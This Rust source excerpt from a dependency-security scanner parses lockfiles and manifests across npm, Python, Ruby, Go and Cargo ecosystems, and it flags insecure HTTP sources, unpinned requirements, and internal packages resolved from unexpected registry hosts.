            findings.push(
                Finding::new(
                    "dependency.python.requirements.insecure-http",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements file uses insecure HTTP transport",
                    "The requirements file references a dependency over plain HTTP.",
                    "Use HTTPS-backed sources only.",
                    format!(
                        "dependency-requirements-http:{}:{}",
                        file.display(),
                        line_number
                    ),
                )
                .with_line(line_number),
            );
        } else if !trimmed.contains("==") && !trimmed.contains(" @ ") {
            findings.push(
                Finding::new(
                    "dependency.python.requirements.unpinned",
                    scanner,
                    Severity::Low,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(file.to_path_buf()),
                    "requirements entry is not exactly pinned",
                    "The requirements file contains a package entry that is not pinned to an exact version.",
                    "Consider exact pinning for higher-reproducibility deployment surfaces.",
                    format!("dependency-requirements-unpinned:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn extract_go_sum_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();

    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(name) = parts.next() else {
            continue;
        };
        let Some(version) = parts.next() else {
            continue;
        };
        let Some(_checksum) = parts.next() else {
            continue;
        };

        let version = version.strip_suffix("/go.mod").unwrap_or(version);
        if version.is_empty() {
            continue;
        }

        record_resolved_dependency(
            &mut dependencies,
            &mut seen,
            ResolvedDependency {
                ecosystem: "Go",
                name: name.to_string(),
                version: version.to_string(),
                file: file.to_path_buf(),
            },
        );
    }

    dependencies
}

fn extract_cargo_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut current_name: Option<String> = None;
    let mut current_version: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed == "[[package]]" {
            push_resolved_dependency(
                &mut dependencies,
                "crates.io",
                file,
                current_name.take(),
                current_version.take(),
            );
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_name = Some(name.trim_end_matches('"').to_string());
        } else if let Some(version) = trimmed.strip_prefix("version = \"") {
            current_version = Some(version.trim_end_matches('"').to_string());
        }
    }

    push_resolved_dependency(
        &mut dependencies,
        "crates.io",
        file,
        current_name,
        current_version,
    );

    dependencies
}

fn extract_node_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let Ok(value) = serde_json::from_str::<Value>(contents) else {
        return Vec::new();
    };

    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();

    if let Some(packages) = value.get("packages").and_then(Value::as_object) {
        for (path_key, package) in packages {
            if path_key.is_empty() {
                continue;
            }

            let Some(version) = package.get("version").and_then(Value::as_str) else {
                continue;
            };
            let name = package
                .get("name")
                .and_then(Value::as_str)
                .map(ToOwned::to_owned)
                .or_else(|| derive_package_name_from_lock_path(path_key));

            let Some(name) = name else {
                continue;
            };

            record_resolved_dependency(
                &mut dependencies,
                &mut seen,
                ResolvedDependency {
                    ecosystem: "npm",
                    name,
                    version: version.to_string(),
                    file: file.to_path_buf(),
                },
            );
        }

        return dependencies;
    }

    if let Some(root_dependencies) = value.get("dependencies").and_then(Value::as_object) {
        collect_legacy_node_dependencies(file, root_dependencies, &mut dependencies, &mut seen);
    }

    dependencies
}

fn extract_pnpm_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();

    for line in contents.lines() {
        let trimmed = line.trim();
        if !trimmed.ends_with(':') {
            continue;
        }

        let key = trimmed
            .trim_end_matches(':')
            .trim_matches('"')
            .trim_matches('\'');
        let Some((name, version)) = parse_pnpm_package_key(key) else {
            continue;
        };

        record_resolved_dependency(
            &mut dependencies,
            &mut seen,
            ResolvedDependency {
                ecosystem: "npm",
                name,
                version,
                file: file.to_path_buf(),
            },
        );
    }

    dependencies
}

fn extract_yarn_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();
    let mut current_name: Option<String> = None;
    let mut current_version: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim_end();
        let is_entry_header =
            !line.starts_with(' ') && !line.starts_with('\t') && trimmed.ends_with(':');

        if is_entry_header {
            if let (Some(name), Some(version)) = (current_name.take(), current_version.take()) {
                record_resolved_dependency(
                    &mut dependencies,
                    &mut seen,
                    ResolvedDependency {
                        ecosystem: "npm",
                        name,
                        version,
                        file: file.to_path_buf(),
                    },
                );
            }

            current_name = trimmed
                .trim_end_matches(':')
                .split(", ")
                .find_map(parse_yarn_selector_name);
            current_version = None;
            continue;
        }

        if let Some(version) = trimmed.trim().strip_prefix("version ") {
            current_version = Some(version.trim_matches('"').trim_matches('\'').to_string());
        }
    }

    if let (Some(name), Some(version)) = (current_name, current_version) {
        record_resolved_dependency(
            &mut dependencies,
            &mut seen,
            ResolvedDependency {
                ecosystem: "npm",
                name,
                version,
                file: file.to_path_buf(),
            },
        );
    }

    dependencies
}

fn extract_gemfile_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();
    let mut current_section = "";
    let mut in_specs = false;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        if !line.starts_with(' ')
            && trimmed
                .chars()
                .all(|character| character.is_ascii_uppercase())
        {
            current_section = trimmed;
            in_specs = false;
            continue;
        }

        if trimmed == "specs:" {
            in_specs = true;
            continue;
        }

        if !in_specs || current_section != "GEM" {
            continue;
        }

        if !line.starts_with("    ") || line.starts_with("      ") {
            continue;
        }

        let Some((name, version)) = parse_gem_lock_spec_entry(trimmed) else {
            continue;
        };

        record_resolved_dependency(
            &mut dependencies,
            &mut seen,
            ResolvedDependency {
                ecosystem: "RubyGems",
                name,
                version,
                file: file.to_path_buf(),
            },
        );
    }

    dependencies
}

fn collect_legacy_node_dependencies(
    file: &Path,
    entries: &serde_json::Map<String, Value>,
    dependencies: &mut Vec<ResolvedDependency>,
    seen: &mut HashSet<(&'static str, String, String)>,
) {
    for (name, entry) in entries {
        if let Some(version) = entry.get("version").and_then(Value::as_str) {
            record_resolved_dependency(
                dependencies,
                seen,
                ResolvedDependency {
                    ecosystem: "npm",
                    name: name.to_string(),
                    version: version.to_string(),
                    file: file.to_path_buf(),
                },
            );
        }

        if let Some(children) = entry.get("dependencies").and_then(Value::as_object) {
            collect_legacy_node_dependencies(file, children, dependencies, seen);
        }
    }
}

fn collect_legacy_node_lock_host_findings(
    scanner: &'static str,
    file: &Path,
    entries: &serde_json::Map<String, Value>,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    for (name, entry) in entries {
        let Some(entry) = entry.as_object() else {
            continue;
        };

        if let Some(host) = entry
            .get("resolved")
            .and_then(Value::as_str)
            .and_then(extract_registry_host)
        {
            record_node_owner_host_mismatch(
                scanner,
                file,
                name,
                &host,
                ownership_rules,
                findings,
                seen,
            );
        }

        if let Some(children) = entry.get("dependencies").and_then(Value::as_object) {
            collect_legacy_node_lock_host_findings(
                scanner,
                file,
                children,
                ownership_rules,
                findings,
                seen,
            );
        }
    }
}

fn derive_package_name_from_lock_path(path_key: &str) -> Option<String> {
    let trimmed = path_key.trim_matches('/');
    if trimmed.is_empty() {
        return None;
    }

    trimmed
        .rfind("node_modules/")
        .map(|index| trimmed[index + "node_modules/".len()..].to_string())
}

fn record_node_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-node-lock-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.node.lockfile.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Node lockfile resolves an internal package from the wrong host",
        format!(
            "The lockfile resolves `{package}` from `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal package."
        ),
        "Regenerate the lockfile against the expected private registry host, or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_node_lock_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    record_node_owner_host_mismatch(
        scanner,
        file,
        package,
        actual_host,
        ownership_rules,
        findings,
        seen,
    );
}

fn record_node_manifest_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-node-manifest-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.node.manifest.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Node manifest points an internal package at the wrong host",
        format!(
            "The manifest points `{package}` at `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal package."
        ),
        "Point the dependency at the expected private registry or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_node_manifest_direct_source_owner_bypass(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    if !package_matches_declared_owner_host(package, ownership_rules, &[actual_host.to_string()]) {
        return;
    }

    let fingerprint = format!(
        "dependency-node-manifest-direct-owner-bypass:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.node.manifest.direct-source-owner-bypass",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Node manifest bypasses declared internal package ownership through a direct source",
        format!(
            "The manifest points internal package `{package}` at a direct remote source on `{actual_host}` instead of using the declared private registry ownership flow."
        ),
        "Prefer the expected private registry release path for internal packages, or narrow the ownership rule if direct sources are intentionally allowed.",
        fingerprint,
    ));
}

fn record_python_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-python-lock-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.python.lockfile.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Python lockfile resolves an internal package from the wrong host",
        format!(
            "The lockfile resolves `{package}` from `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal package."
        ),
        "Regenerate the lockfile against the expected package-index host, or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_python_lock_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    record_python_owner_host_mismatch(
        scanner,
        file,
        package,
        actual_host,
        ownership_rules,
        findings,
        seen,
    );
}

fn record_python_lock_direct_source_owner_bypass(
    scanner: &'static str,
    file: &Path,
    package: &str,
    source_kind: &str,
    source_host: Option<&str>,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let Some(expected_host) = first_expected_host_for_package(package, ownership_rules) else {
        return;
    };

    let source_location = source_host
        .map(|host| format!(" on `{host}`"))
        .unwrap_or_default();
    let fingerprint = format!(
        "dependency-python-lock-direct-owner-bypass:{}:{}:{}:{}",
        file.display(),
        package,
        expected_host,
        source_kind
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.python.lockfile.direct-source-owner-bypass",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Python lockfile bypasses declared internal package ownership through a direct source",
        format!(
            "The lockfile resolves internal package `{package}` through a {source_kind}{source_location} instead of the declared package-index ownership flow for `{expected_host}`."
        ),
        "Prefer the expected package-index release path for internal packages, or narrow the ownership rule if direct-source resolution is intentionally allowed.",
        fingerprint,
    ));
}

fn record_python_manifest_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-python-manifest-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.python.manifest.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Python manifest points an internal package at the wrong host",
        format!(
            "The manifest points `{package}` at `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal package."
        ),
        "Point the dependency at the expected package host or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_python_manifest_direct_source_owner_bypass(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    if !package_matches_declared_owner_host(package, ownership_rules, &[actual_host.to_string()]) {
        return;
    }

    let fingerprint = format!(
        "dependency-python-manifest-direct-owner-bypass:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.python.manifest.direct-source-owner-bypass",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Python manifest bypasses declared internal package ownership through a direct source",
        format!(
            "The manifest points internal package `{package}` at a direct remote source on `{actual_host}` instead of using the declared package-index ownership flow."
        ),
        "Prefer the expected package-index release path for internal packages, or narrow the ownership rule if direct sources are intentionally allowed.",
        fingerprint,
    ));
}

fn record_ruby_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-ruby-lock-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.ruby.lockfile.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Ruby lockfile resolves an internal gem from the wrong host",
        format!(
            "The lockfile resolves `{package}` from `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal gem."
        ),
        "Regenerate the Bundler lockfile against the expected gem source host, or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_ruby_lock_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    record_ruby_owner_host_mismatch(
        scanner,
        file,
        package,
        actual_host,
        ownership_rules,
        findings,
        seen,
    );
}

fn record_ruby_manifest_owner_host_mismatch(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    let actual_hosts = vec![actual_host.to_string()];
    let Some(expected_host) =
        package_missing_expected_host(package, ownership_rules, actual_hosts.as_slice())
    else {
        return;
    };

    let fingerprint = format!(
        "dependency-ruby-manifest-owner-host:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.ruby.manifest.ownership-host-mismatch",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Ruby manifest points an internal gem at the wrong host",
        format!(
            "The manifest points `{package}` at `{actual_host}`, but `.wolfence/config.toml` declares `{expected_host}` as the expected owner host for that internal gem."
        ),
        "Point the gem at the expected source host or update the owner-host rule if the declared mapping is wrong.",
        fingerprint,
    ));
}

fn record_ruby_manifest_direct_source_owner_bypass(
    scanner: &'static str,
    file: &Path,
    package: &str,
    actual_host: &str,
    ownership_rules: &[String],
    findings: &mut Vec<Finding>,
    seen: &mut HashSet<String>,
) {
    if !package_matches_declared_owner_host(package, ownership_rules, &[actual_host.to_string()]) {
        return;
    }

    let fingerprint = format!(
        "dependency-ruby-manifest-direct-owner-bypass:{}:{}:{}",
        file.display(),
        package,
        actual_host
    );
    if !seen.insert(fingerprint.clone()) {
        return;
    }

    findings.push(Finding::new(
        "dependency.ruby.manifest.direct-source-owner-bypass",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Dependency,
        Some(file.to_path_buf()),
        "Ruby manifest bypasses declared internal gem ownership through a direct source",
        format!(
            "The manifest points internal gem `{package}` at a direct Git source on `{actual_host}` instead of using the declared gem-source ownership flow."
        ),
        "Prefer the expected gem source release path for internal gems, or narrow the ownership rule if direct Git sources are intentionally allowed.",
        fingerprint,
    ));
}

fn extract_poetry_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut current_name: Option<String> = None;
    let mut current_version: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed == "[[package]]" {
            push_resolved_dependency(
                &mut dependencies,
                "PyPI",
                file,
                current_name.take(),
                current_version.take(),
            );
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_name = Some(name.trim_end_matches('"').to_string());
        } else if let Some(version) = trimmed.strip_prefix("version = \"") {
            current_version = Some(version.trim_end_matches('"').to_string());
        }
    }

    push_resolved_dependency(
        &mut dependencies,
        "PyPI",
        file,
        current_name,
        current_version,
    );

    dependencies
}

fn extract_uv_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut current_name: Option<String> = None;
    let mut current_version: Option<String> = None;

    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed == "[[package]]" {
            push_resolved_dependency(
                &mut dependencies,
                "PyPI",
                file,
                current_name.take(),
                current_version.take(),
            );
            continue;
        }

        if let Some(name) = trimmed.strip_prefix("name = \"") {
            current_name = Some(name.trim_end_matches('"').to_string());
        } else if let Some(version) = trimmed.strip_prefix("version = \"") {
            current_version = Some(version.trim_end_matches('"').to_string());
        }
    }

    push_resolved_dependency(
        &mut dependencies,
        "PyPI",
        file,
        current_name,
        current_version,
    );

    dependencies
}

fn extract_pipfile_lock_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let Ok(value) = serde_json::from_str::<Value>(contents) else {
        return Vec::new();
    };

    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();

    for entries in [
        value.get("default").and_then(Value::as_object),
        value.get("develop").and_then(Value::as_object),
    ]
    .into_iter()
    .flatten()
    {
        for (name, entry) in entries {
            let Some(version) = entry
                .get("version")
                .and_then(Value::as_str)
                .and_then(|version| version.strip_prefix("=="))
            else {
                continue;
            };

            record_resolved_dependency(
                &mut dependencies,
                &mut seen,
                ResolvedDependency {
                    ecosystem: "PyPI",
                    name: name.to_string(),
                    version: version.to_string(),
                    file: file.to_path_buf(),
                },
            );
        }
    }

    dependencies
}

fn extract_requirements_dependencies(file: &Path, contents: &str) -> Vec<ResolvedDependency> {
    let mut dependencies = Vec::new();
    let mut seen = HashSet::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() || trimmed.starts_with('-') {
            continue;
        }

        let Some((name, version)) = parse_pinned_requirement(trimmed) else {
            continue;
        };

        record_resolved_dependency(
            &mut dependencies,
            &mut seen,
            ResolvedDependency {
                ecosystem: "PyPI",
                name,
                version,
                file: file.to_path_buf(),
            },
        );
    }

    dependencies
}

fn push_resolved_dependency(
    dependencies: &mut Vec<ResolvedDependency>,
    ecosystem: &'static str,
    file: &Path,
    name: Option<String>,
    version: Option<String>,
) {
    let (Some(name), Some(version)) = (name, version) else {
        return;
    };

    dependencies.push(ResolvedDependency {
        ecosystem,
        name,
        version,
        file: file.to_path_buf(),
    });
}

fn record_resolved_dependency(
    dependencies: &mut Vec<ResolvedDependency>,
    seen: &mut HashSet<(&'static str, String, String)>,
    dependency: ResolvedDependency,
) {
    let key = (
        dependency.ecosystem,
        dependency.name.clone(),
        dependency.version.clone(),
    );
    if seen.insert(key) {
        dependencies.push(dependency);
    }
}

fn parse_pnpm_package_key(key: &str) -> Option<(String, String)> {
    let trimmed = key
        .trim_start_matches('/')
        .split('(')
        .next()
        .unwrap_or_default()
        .trim();
    if trimmed.is_empty() || trimmed.starts_with("file:") {
        return None;
    }

    let at_index = if trimmed.starts_with('@') {
        let scope_end = trimmed[1..].find('@')?;
        scope_end + 1
    } else {
        trimmed.rfind('@')?
    };

    let (name, version) = trimmed.split_at(at_index);
    let version = version.trim_start_matches('@');
    if name.is_empty() || version.is_empty() {
        return None;
    }

    Some((name.to_string(), version.to_string()))
}

fn parse_yarn_selector_name(selector: &str) -> Option<String> {
    let trimmed = selector.trim().trim_matches('"').trim_matches('\'');
    if trimmed.is_empty() {
        return None;
    }

    if let Some(protocol_index) = trimmed.find("@npm:") {
        let name = &trimmed[..protocol_index];
        if !name.is_empty() {
            return Some(name.to_string());
        }
    }

    let at_index = if trimmed.starts_with('@') {
        let scope_end = trimmed[1..].find('@')?;
        scope_end + 1
    } else {
        trimmed.find('@')?
    };
    let name = &trimmed[..at_index];
    if name.is_empty() {
        return None;
    }

    Some(name.to_string())
}

fn parse_pinned_requirement(entry: &str) -> Option<(String, String)> {
    let (name, version) = entry.split_once("==")?;
    let normalized_name = name
        .trim()
        .split('[')
        .next()
        .unwrap_or_default()
        .trim()
        .to_string();
    let normalized_version = version
        .trim()
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .trim_end_matches(';')
        .to_string();

    if normalized_name.is_empty() || normalized_version.is_empty() {
        return None;
    }

    Some((normalized_name, normalized_version))
}

fn parse_gem_lock_spec_entry(entry: &str) -> Option<(String, String)> {
    let (name, version) = entry.split_once(" (")?;
    let version = version.trim_end_matches(')');
    if name.is_empty() || version.is_empty() {
        return None;
    }

    Some((name.to_string(), version.to_string()))
}

fn collect_unscoped_node_dependencies(contents: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut current_section: Option<&str> = None;
    let mut section_depth = 0isize;

    for line in contents.lines() {
        let trimmed = line.trim();

        if current_section.is_none() {
            for section in [
                "dependencies",
                "devDependencies",
                "optionalDependencies",
                "peerDependencies",
            ] {
                let marker = format!("\"{section}\"");
                if trimmed.starts_with(&marker) && trimmed.contains('{') {
                    current_section = Some(section);
                    section_depth = brace_delta(trimmed);
                    break;
                }
            }
            continue;
        }

        section_depth += brace_delta(trimmed);
        if section_depth < 0 {
            section_depth = 0;
        }
        if section_depth == 0 {
            current_section = None;
            continue;
        }

        let Some((dependency_name, spec)) = parse_json_dependency_entry(trimmed) else {
            continue;
        };
        if dependency_name.starts_with('@') || dependency_spec_is_direct_source(spec) {
            continue;
        }

        names.push(dependency_name.to_string());
    }

    names
}

fn dependency_spec_is_direct_source(spec: &str) -> bool {
    let lower = spec.trim().to_ascii_lowercase();
    lower.starts_with("git+")
        || lower.starts_with("github:")
        || lower.starts_with("gitlab:")
        || lower.starts_with("bitbucket:")
        || lower.starts_with("file:")
        || lower.starts_with("link:")
        || lower.starts_with("http://")
        || lower.starts_with("https://")
}

fn node_custom_registry_hosts(repo_root: &Path) -> AppResult<Vec<String>> {
    let mut hosts = Vec::new();

    for relative in [".npmrc", ".yarnrc.yml", ".yarnrc.yaml"] {
        let Some(contents) = repo_text_file(&repo_root.join(relative))? else {
            continue;
        };
        for line in contents.lines() {
            if let Some(host) = line_custom_node_registry_host(line) {
                hosts.push(host);
            }
        }
    }

    hosts.sort();
    hosts.dedup();
    Ok(hosts)
}

fn line_custom_node_registry_host(line: &str) -> Option<String> {
    let trimmed = strip_inline_comment(line).trim();
    if trimmed.is_empty() {
        return None;
    }

    if let Some((key, raw_value)) = trimmed.split_once('=') {
        let key = key.trim().to_ascii_lowercase();
        let value = trim_wrapping_quotes(raw_value.trim());
        if key == "registry" || key.ends_with(":registry") {
            return non_default_node_registry_host(value);
        }
    }

    if let Some(value) = yaml_scalar_value(trimmed, "npmRegistryServer:") {
        return non_default_node_registry_host(value);
    }

    None
}

fn requirements_manifest_paths(repo_root: &Path) -> Vec<PathBuf> {
    let mut manifests = Vec::new();
    if let Ok(entries) = fs::read_dir(repo_root) {
        for entry in entries.flatten() {
            let path = entry.path();
            let Some(file_name) = path.file_name().and_then(|value| value.to_str()) else {
                continue;
            };
            if file_name.starts_with("requirements") && file_name.ends_with(".txt") {
                if let Ok(relative) = path.strip_prefix(repo_root) {
                    manifests.push(relative.to_path_buf());
                }
            }
        }
    }
    manifests.sort();
    manifests
}

fn requirements_uses_custom_index(contents: &str) -> bool {
    !requirements_custom_index_hosts(contents).is_empty()
}

fn collect_unqualified_requirement_names(contents: &str) -> Vec<String> {
    let mut names = Vec::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if trimmed.is_empty() || trimmed.starts_with('-') {
            continue;
        }

        if trimmed.contains("://") || trimmed.contains(" @ ") {
            continue;
        }

        let name = trimmed
            .split(['=', '<', '>', '!', '~', ';', '[', ' '])
            .next()
            .unwrap_or_default()
            .trim();
        if name.is_empty() {
            continue;
        }

        names.push(name.to_string());
    }

    names
}

fn package_matches_ownership_policy(
    package: &str,
    exact_allowlist: &[String],
    prefix_allowlist: &[String],
) -> bool {
    exact_allowlist
        .iter()
        .any(|candidate| candidate.eq_ignore_ascii_case(package))
        || prefix_allowlist.iter().any(|prefix| {
            !prefix.is_empty()
                && package
                    .to_ascii_lowercase()
                    .starts_with(&prefix.to_ascii_lowercase())
        })
}

fn package_missing_expected_host<'a>(
    package: &str,
    ownership_rules: &'a [String],
    configured_hosts: &[String],
) -> Option<&'a str> {
    let expected_hosts: Vec<&str> = ownership_rules
        .iter()
        .filter_map(|rule| {
            let (host, pattern) = rule.split_once('=')?;
            package_matches_rule_pattern(package, pattern).then_some(host)
        })
        .collect();

    let first_expected_host = *expected_hosts.first()?;
    let configured = expected_hosts.iter().any(|host| {
        configured_hosts
            .iter()
            .any(|configured| configured.eq_ignore_ascii_case(host))
    });

    if configured {
        None
    } else {
        Some(first_expected_host)
    }
}

fn first_expected_host_for_package<'a>(
    package: &str,
    ownership_rules: &'a [String],
) -> Option<&'a str> {
    ownership_rules.iter().find_map(|rule| {
        let (host, pattern) = rule.split_once('=')?;
        package_matches_rule_pattern(package, pattern).then_some(host)
    })
}

fn package_matches_declared_owner_host(
    package: &str,
    ownership_rules: &[String],
    configured_hosts: &[String],
) -> bool {
    ownership_rules
        .iter()
        .filter_map(|rule| {
            let (host, pattern) = rule.split_once('=')?;
            package_matches_rule_pattern(package, pattern).then_some(host)
        })
        .any(|host| {
            configured_hosts
                .iter()
                .any(|configured| configured.eq_ignore_ascii_case(host))
        })
}

fn package_matches_rule_pattern(package: &str, pattern: &str) -> bool {
    if let Some(prefix) = pattern.strip_suffix('*') {
        return package
            .to_ascii_lowercase()
            .starts_with(&prefix.to_ascii_lowercase());
    }

    pattern.eq_ignore_ascii_case(package)
}

fn requirements_custom_index_hosts(contents: &str) -> Vec<String> {
    let mut hosts = Vec::new();

    for line in contents.lines() {
        let trimmed = strip_inline_comment(line).trim();
        if let Some(value) = requirements_index_url_value(trimmed) {
            if let Some(host) = extract_registry_host(value) {
                hosts.push(host);
            }
        }
    }

    hosts.sort();
    hosts.dedup();
    hosts
}

fn requirements_index_url_value(line: &str) -> Option<&str> {
    for prefix in ["--extra-index-url", "--index-url", "--find-links"] {
        if let Some(value) = line.strip_prefix(prefix) {
            let trimmed = value.trim();
            if let Some(value) = trimmed.strip_prefix('=') {
                return Some(value.trim());
            }
            if !trimmed.is_empty() {
                return Some(trimmed);
            }
        }
    }

    line.strip_prefix("-f ").map(str::trim)
}

fn non_default_node_registry_host(value: &str) -> Option<String> {
    let host = extract_registry_host(value)?;
    if host.contains("registry.npmjs.org") || host.contains("registry.yarnpkg.com") {
        return None;
    }
    Some(host)
}

